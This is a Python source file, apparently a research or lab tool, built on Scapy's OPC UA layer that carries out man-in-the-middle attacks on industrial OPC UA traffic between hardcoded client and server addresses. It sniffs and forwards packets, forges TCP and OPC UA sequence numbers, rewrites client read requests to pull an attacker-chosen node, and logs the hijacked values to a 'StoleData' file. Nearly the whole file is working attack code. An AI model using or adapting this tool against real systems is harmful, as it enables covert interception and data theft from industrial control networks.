# OPC UA stack layer for Scapy
# Set log level to benefit from Scapy warnings
import sys
import logging
logging.getLogger("scapy").setLevel(1)
import imp
import time
import datetime

import scapy.contrib.opcua.binary.bindings
from scapy.layers.inet import TCP_client
from scapy.config import conf
from scapy.main import interact
from scapy.all import *
from scapy.contrib.opcua.binary.builtinTypes import *
from scapy.contrib.opcua.helpers import *
from scapy.fields import *
from scapy.contrib.opcua.binary.tcp import *
from scapy.contrib.opcua.binary.secureConversation import *
from scapy.contrib.opcua.binary.secureConversationClient import UaSecureConversationSocket
from scapy.contrib.opcua.binary.uaTypes import *
from scapy.contrib.opcua.crypto.securityPolicies import *
from scapy.contrib.opcua.crypto.uacrypto import *
from scapy.contrib.opcua.binary.sessionClient import UaSessionSocket
from scapy.contrib.opcua.binary.tcpClient import UaTcpSocket
from scapy.contrib.opcua.binary.sessionClient import UaSessionSocket
from scapy.contrib.opcua.binary.secureConversationClient import UaSecureConversationSocket
from scapy.contrib.opcua.helpers import UaConnectionContext

# Matrix of the Maps of each session beetwen Alice with Eva and Bob with Eva
mapAtoB = [[0, 0, 0, 0, 0]]
mapBtoA = [[0, 0, 0, 0, 0]]
sesAtoB = [[0, 0, 0, 0]]
sesBtoA = [[0, 0, 0, 0]]
lastLength = 0
filaA = 0
filaB = 0
filaAOPC = 0
filaBOPC = 0
numAttack = 0
changeOPC = 0
phase = 1
attackNow = 0
inter = ""
f = ""
client = "10.200.5.24"
server = "10.200.5.22"
eva = "172.16.201.128"
cResponse = IP(src = client, dst = server) / TCP(dport = 4840)
sResponse = IP(src = server, dst = client) / TCP(sport = 4840)

# Print the Matrix of TCP Session of both comunications
def printMatrixTCP():
	global mapBtoA
	global mapAtoB

	i = 0
	j = 0
	print("Init Matrix of Alice To Eva Comunication")
	print("ACK A, Ack E, Seq A, Seq E")
	while i < len(mapAtoB):
		while j < len(mapAtoB[i]):
			print(mapAtoB[i][j], end = "\t")
			j = j + 1
		i = i + 1
		print("\n")
	i = 0
	j = 0
	print("ACK B, Ack E, Seq B, Seq E")
	while i < len(mapBtoA):
		while j < len(mapBtoA[i]):
			print(mapBtoA[i][j], end = "\t")
			j = j + 1
		i = i + 1			
		print("\n")
	print("End.")	

# TCP Sessions simulation process
def sessionTCPMap(option, ackReq, seqReq, packageLen):
	global mapBtoA
	global mapAtoB
	global attackNow
	# Position 0 -> ACK of victim and 2 -> Seq of victim
	# Position 1 -> SEQ of Eva to Alice or Bob and 3 -> ACK of Eva to Alice or Bob
	# Position 4 of each matrix is for store the TCP size package of each datagram to send
	if option == 0: # Option Equal to 0 is Alice with Eva, then is Eva to Bob
		mapAtoB[filaA][0] = ackReq
		mapAtoB[filaA][2] = seqReq
		mapAtoB[filaA][4] = packageLen
		if attackNow >= 1:
			mapAtoB[filaA][1] = mapBtoA[filaA - 1][0] # SEQ
			if mapBtoA[filaA - 1][4] == 0:
				mapAtoB[filaA][3] = mapBtoA[filaA - 1][2] + 1 # ACK
			else:
				mapAtoB[filaA][3] = mapBtoA[filaA - 1][2] + mapBtoA[filaA - 1][4] # ACK
		else:
			mapAtoB[filaA][1] = random.randint(0, 4294967296) # SEQ
			mapAtoB[filaA][3] = 0 # ACK
		mapAtoB.append([0, 0, 0, 0, 0])
	else: # Other values such >= 1 is Bob with Eva, then it is Eva to Alice
		mapBtoA[filaB][0] = ackReq
		mapBtoA[filaB][2] = seqReq
		mapBtoA[filaB][4] = packageLen
		if attackNow >= 1:
			mapBtoA[filaB][1] = mapAtoB[filaB - numAttack][0] # SEQ
			if mapAtoB[filaB - numAttack][4] == 0:
				mapBtoA[filaB][3] = mapAtoB[filaB - numAttack][2] + 1 # ACK
			else:
				mapBtoA[filaB][3] = mapAtoB[filaB - numAttack][2] + mapAtoB[filaB - numAttack][4] # ACK
		else:
			mapBtoA[filaB][1] = random.randint(0, 4294967296) # SEQ
			mapBtoA[filaB][3] = mapAtoB[filaB - numAttack][2] + 1 # ACK
		mapBtoA.append([0, 0, 0, 0, 0])

# It's like sessionTCPMap function but in this case it's for OPC UA sessions variables
def sessionOPCMap(option, seqNum, reqID):
	global sesAtoB
	global sesBtoA

	if option == 0:
		sesAtoB[filaAOPC][0] = seqNum
		sesAtoB[filaAOPC][2] = reqID
		if attackNow <= 2:
			sesAtoB[filaAOPC][1] = seqNum
			sesAtoB[filaAOPC][3] = reqID
		else:
			sesAtoB[filaAOPC][1] = sesBtoA[filaAOPC - 1][0] + numAttack
			sesAtoB[filaAOPC][3] = sesBtoA[filaAOPC - 1][2] + numAttack
		sesAtoB.append([0, 0, 0, 0])
		print("Session Send to Server is", (sesAtoB[filaAOPC][1], sesAtoB[filaAOPC][3]))
	else:
		sesBtoA[filaBOPC][0] = seqNum
		sesBtoA[filaBOPC][2] = reqID
		if attackNow <= 2:
			sesBtoA[filaBOPC][1] = seqNum
			sesBtoA[filaBOPC][3] = reqID
		else:
			sesBtoA[filaBOPC][1] = sesBtoA[filaBOPC][0] - numAttack
			sesBtoA[filaBOPC][3] = sesBtoA[filaBOPC][2] - numAttack
		print("Session Send to Client is", (sesBtoA[filaBOPC][1], sesBtoA[filaBOPC][3]))
		sesBtoA.append([0, 0, 0, 0])

def returnNodeRead(ns, id):
    idToRead = UaNumericNodeId(Namespace = ns, Identifier = id) # NodeId of a String in server
    rvId = UaReadValueId()
    rvId.NodeId = idToRead
    rvId.AttributeId = 0xd
    return rvId

def writeResult(data):
	try:
		data[0].show()
		date = data[0].SourceTimestamp
		print("Writing in the file")
		file = open("StoleData", "a")
		file.write("Data Stolen at " + date.strftime("%Y-%m-%d %H:%M:%S") + "-> " + data[0].Value.Value[0].data + "\n")
		file.close()
		print("End Writing")
	except IOError:
		print("Error With The File")

# Create a conversation with Bob being Alice in Eva
def aliceSpoofing(cap):
	response = cap.copy()

	if response[IP].src == "127.0.0.1":
		print("Client datagram...")
		response[IP].src = client
		response[IP].dst = server
	else:
		print("Server datagram...")
		response[IP].src = "127.0.0.1"
		response[IP].dst = "127.0.0.1"
		
	send(response, iface = "eth0", return_packets = False, count = 1)
# Change a variable of one datagram with destination to Alice or Bob
def mitmFase1(cap):
	global phase
	global attackNow
	global cResponse
	global sResponse

	print("PHASE ATTACK IS ON ", attackNow)
	if cap[IP].src == client:
		if phase == 1:
			print("Client datagram...")
			cResponse[TCP].sport = cap[TCP].sport
			cResponse[TCP].flags = cap[TCP].flags
			cResponse[TCP].options = cap[TCP].options
			cResponse[IP].id = cap[IP].id
			cResponse[IP].flags = cap[IP].flags
			cResponse[TCP].seq = cap[TCP].seq
			cResponse[TCP].ack = cap[TCP].ack
			# Response from Alice to Bob
			if cap.haslayer(TCP) and cap[TCP].flags == "S": # TCP SYN
				send(cResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 2
			elif cap.haslayer(UaTcp): # OPC UA Hello
				cResponse[TCP].payload = UaTcp(cap[TCP].payload)
				send(cResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 2
			elif cap.haslayer(UaSecureConversationAsymmetric): # OPC UA OpenSC Asymetric
				cResponse[TCP].payload = UaSecureConversationAsymmetric(cap[TCP].payload)
				send(cResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 2
			elif cap.haslayer(UaSecureConversationSymmetric): # OPC UA Symetric Message Interchange				
				if cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'CLO':
					print("Closing Channel Client.................................................")
					cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
					cResponse[TCP].flags = "PFA"
					send(cResponse, iface = "eth0", return_packets = False, count = 1)
					phase = 2
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'MSG':
					if attackNow >= 0 and cap[UaSecureConversationSymmetric].Payload.DataTypeEncoding.Identifier == 631:
						if attackNow == 0:
							print("Sending the Attack Datagram")
							cap[UaSecureConversationSymmetric].Payload.Message.NodesToRead = returnNodeRead(2, 3) # Cambiar constantes por variables a atacar
							attackNow = 1
						cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(cResponse, iface = "eth0", return_packets = False, count = 1)
						phase = 2				
					else:
						cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(cResponse, iface = "eth0", return_packets = False, count = 1)
						phase = 2
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'OPN':	
					cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
					send(cResponse, iface = "eth0", return_packets = False, count = 1)
					phase = 2		
	else:
		if phase == 2:
			print("Server datagram...")
			sResponse[TCP].dport = cap[TCP].dport
			sResponse[TCP].flags = cap[TCP].flags
			sResponse[IP].id = cap[IP].id
			sResponse[IP].flags = cap[IP].flags
			sResponse[TCP].seq = cap[TCP].seq
			sResponse[TCP].ack = cap[TCP].ack
			# Response from Bob to Alice
			if cap.haslayer(TCP) and cap[TCP].flags == "SA": # TCP SYN
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 1
			elif cap[TCP].flags == "FA" and not cap.haslayer(UaSecureConversationSymmetric): # TCP END + ACK
				sResponse[TCP].remove_payload()
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				print("Closing Channel Server.................................................")
				phase = 1
			elif cap.haslayer(UaTcp): # OPC UA ACK
				sResponse[TCP].payload = UaTcp(cap[TCP].payload)
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 1
			elif cap.haslayer(UaSecureConversationAsymmetric): # OPC UA Asymetric
				sResponse[TCP].payload = UaSecureConversationAsymmetric(cap[TCP].payload)
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 1
			elif cap.haslayer(UaSecureConversationSymmetric): # OPC UA Symetric Message Interchange					
				if cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'MSG':
					if attackNow == 2 and cap[UaSecureConversationSymmetric].Payload.DataTypeEncoding.Identifier == 634:
						print("JEJE I've got your Information")
						writeResult(cap[UaSecureConversationSymmetric].Payload.Message.Results[0])
						attackNow = 2
						phase = 1
					else:
						sResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(sResponse, iface = "eth0", return_packets = False, count = 1)
						phase = 1
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'OPN':	
					send(sResponse, iface = "eth0", return_packets = False, count = 1)
					phase = 1

# Send a OPC UA datagram with 2 variables in only one request
def mitmFase2(cap):
	global phase
	global attackNow
	global cResponse
	global sResponse

	print("PHASE ATTACK IS ON ", attackNow)
	if cap[IP].src == client:
		if phase == 1:
			print("Client datagram...")
			cResponse[TCP].sport = cap[TCP].sport
			cResponse[TCP].flags = cap[TCP].flags
			cResponse[TCP].options = cap[TCP].options
			cResponse[IP].id = cap[IP].id
			cResponse[IP].flags = cap[IP].flags
			cResponse[TCP].seq = cap[TCP].seq
			cResponse[TCP].ack = cap[TCP].ack
			# Response from Alice to Bob
			if cap.haslayer(TCP) and cap[TCP].flags == "S": # TCP SYN
				send(cResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 2
			elif cap.haslayer(UaTcp): # OPC UA Hello
				cResponse[TCP].payload = UaTcp(cap[TCP].payload)
				send(cResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 2
			elif cap.haslayer(UaSecureConversationAsymmetric): # OPC UA OpenSC Asymetric
				cResponse[TCP].payload = UaSecureConversationAsymmetric(cap[TCP].payload)
				send(cResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 2
			elif cap.haslayer(UaSecureConversationSymmetric): # OPC UA Symetric Message Interchange				
				if cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'CLO':
					print("Closing Channel Client.................................................")
					cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
					cResponse[TCP].flags = "PFA"
					send(cResponse, iface = "eth0", return_packets = False, count = 1)
					phase = 2
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'MSG':
					if attackNow >= 0 and cap[UaSecureConversationSymmetric].Payload.DataTypeEncoding.Identifier == 631:
						if attackNow == 0:
							print("Sending the Attack Datagram")
							cap[UaSecureConversationSymmetric].Payload.Message.NoOfNodesToRead = 2
							cap[UaSecureConversationSymmetric].Payload.Message.NodesToRead = [returnNodeRead(2, 3), cap[UaSecureConversationSymmetric].Payload.Message.NodesToRead[0]] # Cambiar constantes por variables a atacar
							attackNow = 1
							cap[UaSecureConversationSymmetric].show()
						cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(cResponse, iface = "eth0", return_packets = False, count = 1)
						phase = 2				
					else:
						cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(cResponse, iface = "eth0", return_packets = False, count = 1)
						phase = 2
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'OPN':	
					cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
					send(cResponse, iface = "eth0", return_packets = False, count = 1)
					phase = 2		
	else:
		if phase == 2:
			print("Server datagram...")
			sResponse[TCP].dport = cap[TCP].dport
			sResponse[TCP].flags = cap[TCP].flags
			sResponse[IP].id = cap[IP].id
			sResponse[IP].flags = cap[IP].flags
			sResponse[TCP].seq = cap[TCP].seq
			sResponse[TCP].ack = cap[TCP].ack
			# Response from Bob to Alice
			if cap.haslayer(TCP) and cap[TCP].flags == "SA": # TCP SYN
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 1
			elif cap[TCP].flags == "FA" and not cap.haslayer(UaSecureConversationSymmetric): # TCP END + ACK
				sResponse[TCP].remove_payload()
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				print("Closing Channel Server.................................................")
				phase = 1
			elif cap.haslayer(UaTcp): # OPC UA ACK
				sResponse[TCP].payload = UaTcp(cap[TCP].payload)
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 1
			elif cap.haslayer(UaSecureConversationAsymmetric): # OPC UA Asymetric
				sResponse[TCP].payload = UaSecureConversationAsymmetric(cap[TCP].payload)
				send(sResponse, iface = "eth0", return_packets = False, count = 1)
				phase = 1
			elif cap.haslayer(UaSecureConversationSymmetric): # OPC UA Symetric Message Interchange					
				if cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'MSG':
					if attackNow == 1 and cap[UaSecureConversationSymmetric].Payload.DataTypeEncoding.Identifier == 634:
						print("I've got your Information")
						writeResult(cap[UaSecureConversationSymmetric].Payload.Message.Results[0])
						attackNow = 2
						phase = 1
					elif attackNow == 3:
						sResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(sResponse, iface = "eth0", return_packets = False, count = 1)
						phase = 1
					else:
						sResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(sResponse, iface = "eth0", return_packets = False, count = 1)
						phase = 1
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'OPN':	
					send(sResponse, iface = "eth0", return_packets = False, count = 1)
					phase = 1

# Insert package in the comunication without comunication alteration
def mitmFase3(cap):
	global phase
	global attackNow
	global cResponse
	global sResponse
	global filaA
	global filaAOPC
	global filaBOPC
	global filaB
	global lastLength
	global numAttack

	if cap[IP].src == client:
		if phase == 1:
			print("PHASE ATTACK IS ON ", attackNow)
			print("Client datagram...")
			cResponse[TCP].sport = cap[TCP].sport
			cResponse[TCP].flags = cap[TCP].flags
			cResponse[TCP].options = cap[TCP].options
			cResponse[IP].id = cap[IP].id + numAttack
			cResponse[IP].flags = cap[IP].flags 
			#cResponse[TCP].ack = mapAtoB[filaA][3] # 3 -> Corresponse to ack for Eva to Bob from "Alice"
			#cResponse[TCP].seq = mapAtoB[filaA][1] # 1 -> Corresponse to seq for Eva to Bob from "Alice"
			# Response from Alice to Bob
			if cap.haslayer(TCP) and cap[TCP].flags == "S": # TCP SYN
				sessionTCPMap(0, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				cResponse[TCP].ack = mapAtoB[filaA][3]
				cResponse[TCP].seq = mapAtoB[filaA][1]
				send(cResponse)
				phase = 2
				filaA = filaA + 1
				attackNow = 0
			elif cap.haslayer(UaTcp): # OPC UA Hello
				sessionTCPMap(0, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				cResponse[TCP].ack = mapAtoB[filaA][3]
				cResponse[TCP].seq = mapAtoB[filaA][1]
				cResponse[TCP].payload = UaTcp(cap[TCP].payload)
				#send(cResponse, iface = "eth0", return_packets = False, count = 1)
				send(cResponse)
				phase = 2
				filaA = filaA + 1
				attackNow = 1
			elif cap.haslayer(UaSecureConversationAsymmetric): # OPC UA OpenSC Asymetric
				sessionTCPMap(0, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				cResponse[TCP].ack = mapAtoB[filaA][3]
				cResponse[TCP].seq = mapAtoB[filaA][1]
				cResponse[TCP].payload = UaSecureConversationAsymmetric(cap[TCP].payload)
				send(cResponse)
				phase = 2
				filaA = filaA + 1
				attackNow = 1
			elif cap.haslayer(UaSecureConversationSymmetric): # OPC UA Symetric Message Interchange				
				sessionTCPMap(0, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				cResponse[TCP].ack = mapAtoB[filaA][3]
				cResponse[TCP].seq = mapAtoB[filaA][1]
				sessionOPCMap(0, cap[UaSecureConversationSymmetric].SequenceHeader.SequenceNumber, cap[UaSecureConversationSymmetric].SequenceHeader.RequestId)
				if cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'CLO':
					print("Closing Channel Client.................................................")
					cap[UaSecureConversationSymmetric].SequenceHeader.SequenceNumber = sesAtoB[filaAOPC][1]
					cap[UaSecureConversationSymmetric].SequenceHeader.RequestId = sesAtoB[filaAOPC][3]
					cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
					cResponse[TCP].flags = "PFA"
					send(cResponse)
					phase = 2
					filaA = filaA + 1
					filaAOPC = filaAOPC + 1
					attackNow = 1
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'MSG':
					if attackNow >= 1 and cap[UaSecureConversationSymmetric].Payload.DataTypeEncoding.Identifier == 631:
						cap[UaSecureConversationSymmetric].SequenceHeader.SequenceNumber = sesAtoB[filaAOPC][1]
						cap[UaSecureConversationSymmetric].SequenceHeader.RequestId = sesAtoB[filaAOPC][3]						
						if attackNow == 1:
							cap[UaSecureConversationSymmetric].Payload.Message.NodesToRead = returnNodeRead(2, 3) # Cambiar constantes por variables a atacar
							attackNow = 2
							print("It's sending the attack")						
						cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(cResponse)
						filaA = filaA + 1
						filaAOPC = filaAOPC + 1
						phase = 2
					else:
						cap[UaSecureConversationSymmetric].SequenceHeader.SequenceNumber = sesAtoB[filaAOPC][1]
						cap[UaSecureConversationSymmetric].SequenceHeader.RequestId = sesAtoB[filaAOPC][3]
						cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						filaA = filaA + 1
						filaAOPC = filaAOPC + 1
						send(cResponse)
						attackNow = 1
						phase = 2
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'OPN':	
					cap[UaSecureConversationSymmetric].SequenceHeader.SequenceNumber = sesAtoB[filaAOPC][1]
					cap[UaSecureConversationSymmetric].SequenceHeader.RequestId = sesAtoB[filaAOPC][3]
					cResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
					send(cResponse)
					phase = 2	
					filaA = filaA + 1	
					filaAOPC = filaAOPC + 1
					attackNow = 1
	elif cap[IP].src == server:
		if phase == 2:
			print("PHASE ATTACK IS ON ", attackNow)
			print("Server datagram...")
			sResponse[TCP].dport = cap[TCP].dport
			sResponse[TCP].flags = cap[TCP].flags
			sResponse[TCP].options = cap[TCP].options
			sResponse[IP].id = cap[IP].id - numAttack
			sResponse[IP].flags = cap[IP].flags
			# Response from Bob to Alice
			if cap.haslayer(TCP) and cap[TCP].flags == "SA": # TCP SYN
				sessionTCPMap(1, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				sResponse[TCP].ack = mapBtoA[filaB][3]
				sResponse[TCP].seq = mapBtoA[filaB][1]
				send(sResponse)
				phase = 1
				filaB = filaB + 1
				attackNow = 1
			elif cap[TCP].flags == "FA" and not cap.haslayer(UaSecureConversationSymmetric): # TCP END + ACK
				sResponse[TCP].remove_payload()
				sessionTCPMap(1, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				sResponse[TCP].ack = mapBtoA[filaB][3]
				sResponse[TCP].seq = mapBtoA[filaB][1]
				send(sResponse)
				print("Closing Channel Server.................................................")
				phase = 1
				filaB = filaB + 1
				attackNow = 0
			elif cap.haslayer(UaTcp): # OPC UA ACK
				sessionTCPMap(1, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				sResponse[TCP].ack = mapBtoA[filaB][3]
				sResponse[TCP].seq = mapBtoA[filaB][1]				
				sResponse[TCP].payload = UaTcp(cap[TCP].payload)
				send(sResponse)
				phase = 1
				filaB = filaB + 1
				attackNow = 1
			elif cap.haslayer(UaSecureConversationAsymmetric): # OPC UA Asymetric
				sessionTCPMap(1, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				sResponse[TCP].ack = mapBtoA[filaB][3]
				sResponse[TCP].seq = mapBtoA[filaB][1]
				sResponse[TCP].payload = UaSecureConversationAsymmetric(cap[TCP].payload)
				send(sResponse)
				phase = 1
				filaB = filaB + 1
				attackNow = 1
			elif cap.haslayer(UaSecureConversationSymmetric): # OPC UA Symetric Message Interchange	
				sessionTCPMap(1, cap[TCP].ack, cap[TCP].seq, len(cap[TCP].payload))
				sResponse[TCP].ack = mapBtoA[filaB][3]
				sResponse[TCP].seq = mapBtoA[filaB][1]
				sessionOPCMap(1, cap[UaSecureConversationSymmetric].SequenceHeader.SequenceNumber, cap[UaSecureConversationSymmetric].SequenceHeader.RequestId)			
				cap[UaSecureConversationSymmetric].SequenceHeader.SequenceNumber = sesBtoA[filaBOPC][1]
				cap[UaSecureConversationSymmetric].SequenceHeader.RequestId = sesBtoA[filaBOPC][3]
				if cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'MSG':
					if attackNow >= 2 and cap[UaSecureConversationSymmetric].Payload.DataTypeEncoding.Identifier == 634:	
						if attackNow == 2:
							writeResult(cap[UaSecureConversationSymmetric].Payload.Message.Results[0])
							numAttack = numAttack + 1
							attackNow = 3
						else:
							sResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
							send(sResponse)
						phase = 1
						filaB = filaB + 1
						filaBOPC = filaBOPC + 1				
					else:
						sResponse[TCP].payload = UaSecureConversationSymmetric(cap[TCP].payload)
						send(sResponse)
						phase = 1
						filaB = filaB + 1
						filaBOPC = filaBOPC + 1
						attackNow = 1
				elif cap[UaSecureConversationSymmetric].MessageHeader.MessageType == b'OPN':	
					send(sResponse)
					phase = 1
					filaB = filaB + 1
					filaBOPC = filaBOPC + 1
					attackNow = 1

# For sniff the comunication between two nodes, write the result in a pcap file
def eavesdropping(inter, f = "tcp port 4840 and host " + client, path = "eavesdropping.pcap"):
	try:
		print("It Is Writing -> 1 to Up Ip Forward")
		file = open("/proc/sys/net/ipv4/ip_forward", "w")
		file.write("1")
		file.close()
		print("Start Eavesdropping.")
		cap = sniff(iface = inter, filter = f)
		print("End sniffing.\nSave the sniffing in pcap file")
		wrpcap(path, cap)
		print("It Is Writing -> 0 to Cancel Ip Forward")
		file = open("/proc/sys/net/ipv4/ip_forward", "w")
		file.write("0")
		file.close()
	except KeyboardInterrupt:
		sys.exit()

# sniffing
def sniffing(inter, c = 0, f = "tcp port 4840 and host " + client):
	print("Start sniffing...")
	try:
		print("New Datagram Reading")
		sniff(iface = inter, filter = f, store = 0, count = c, prn = eavesdropping)
	except KeyboardInterrupt:
		print("End sniffing.")
		#sys.exit()

def printCommands():
	print("Select one of those commands:")
	print("\t1) Eavesdropping.")
	print("\t2) Client spoofing")
	print("\t3) Mitm Fase 1.")
	print("\t4) Mitm Fase 2.")
	print("\t5) Mitm Fase 3.")
	print("\t6) Exit.")
	return(input("Type the number of the command: "))

def selectOptions():
	global f
	global inter

	inter = input("Enter a interface: ")
	if inter == "":
		inter = "lo"
	print("You selected the default interface, that is:", inter)
	f = input("Enter a valid filter: ")
	if f == "":
		f = "tcp port 4840 and host " + client			
	print("You selected the default filter, that is:", f)

if __name__ == "__main__":
	exit = 1
	userInput = ''
	while exit:
		userInput = printCommands()
		if userInput == '1':
			print("Eavesdropping command.")
			selectOptions()
			try:
				print("New Datagram Reading")
				eavesdropping(inter, f)
				break
			except KeyboardInterrupt:
				print("End sniffing.")
				#sys.exit()
				break
		elif userInput == '2':
			print("Client spoofing command.")
			try:
				print("New Datagram Reading")
				print("In development...")
				#sniff(iface = "lo", filter = "tcp port 4840 and host 127.0.0.1", store = 0, count = 0, prn = aliceSpoofing)
				break
			except KeyboardInterrupt:
				print("End sniffing.")
				#sys.exit()
				break	
		elif userInput == '3':
			print("MITM fase 1 command.")
			selectOptions()
			try:
				print("New Datagram Reading")
				sniff(iface = inter, filter = f, store = 0, count = 0, prn = mitmFase1)
				break
			except KeyboardInterrupt:
				print("End sniffing.")
				#sys.exit()
				break			
		elif userInput == '4':
			print("MITM fase 2 command.")
			selectOptions()
			try:
				print("New Datagram Reading")
				sniff(iface = inter, filter = f, store = 0, count = 0, prn = mitmFase2)
				break
			except KeyboardInterrupt:
				print("End sniffing.")
				#sys.exit()
				break
		elif userInput == '5':
			print("MITM fase 3 command.")
			selectOptions()
			try:
				print("New Datagram Reading")
				sniff(iface = inter, filter = f, store = 0, count = 0, prn = mitmFase3)
				break
			except KeyboardInterrupt:
				print("End sniffing.")
				#sys.exit()
				break
		elif userInput == '6':
			print("Exit command.")
			exit = 0
			break
		else:
		    print("Command not exist.")